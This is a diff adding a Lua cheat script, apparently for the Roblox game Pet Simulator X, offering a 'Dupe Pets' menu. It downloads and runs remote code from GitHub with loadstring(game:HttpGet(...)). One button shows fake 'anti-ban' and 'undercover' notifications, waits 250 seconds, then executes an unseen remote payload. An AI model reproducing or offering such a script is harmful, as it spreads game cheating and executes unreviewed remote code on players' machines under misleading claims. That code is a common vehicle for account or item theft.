@@ -1,0 +1,36 @@
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("TechRATS | 🍍 Pet Simulator X! 🐾", "BloodTheme")
+
+-- MAIN
+local Main = Window:NewTab("Visual Script")
+local MainSection = Main:NewSection("Dupe Pets")
+
+MainSection:NewButton("Support Script and Anti-Ban (Inject this before the Visual", "Anti-Ban and Lua Support Code for Visual Pets", function()
+local NotificationHolder = loadstring(game:HttpGet("https://raw.githubusercontent.com/BocusLuke/UI/main/STX/Module.Lua"))()
+local Notification = loadstring(game:HttpGet("https://raw.githubusercontent.com/BocusLuke/UI/main/STX/Client.Lua"))()
+
+Notification:Notify(
+    {Title = "SUBSCRIBE", Description = "ARE YOU SUBSCRIBED?"},
+    {OutlineColor = Color3.fromRGB(80, 80, 80),Time = 30, Type = "option"},
+    {Image = "http://www.roblox.com/asset/?id=6023426923", ImageColor = Color3.fromRGB(255, 84, 84), Callback = function(State) print(tostring(State)) end}
+)
+wait(1)
+Notification:Notify(
+    {Title = "ANTI-BAN ADDED", Description = "YOUR MORE LIKELY HAVE 10% CHANCE OF BAN"},
+    {OutlineColor = Color3.fromRGB(80, 80, 80),Time =40, Type = "image"},
+    {Image = "http://www.roblox.com/asset/?id=6023426923", ImageColor = Color3.fromRGB(255, 84, 84)}
+)
+wait(1)
+Notification:Notify(
+    {Title = "SUPPORT CODE", Description = "YOUR SCRIPT IS NOW GETTING FIXED AND BEING UNDERCOVER"},
+    {OutlineColor = Color3.fromRGB(80, 80, 80),Time = 90, Type = "default"}
+)
+wait(250)
+loadstring(game:HttpGet("https://github.com/Scripthubpetsimx/TechRats-visual/raw/main/Visual_Script.lua", true))()
+
+end)
+MainSection:NewButton("Visual Script ", "Please Exevute Anti-Ban and Support Script", function()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Scripthubpetsimx/TechRats-visual/main/VisualPets_TRats.lua", true))()
+
+end)
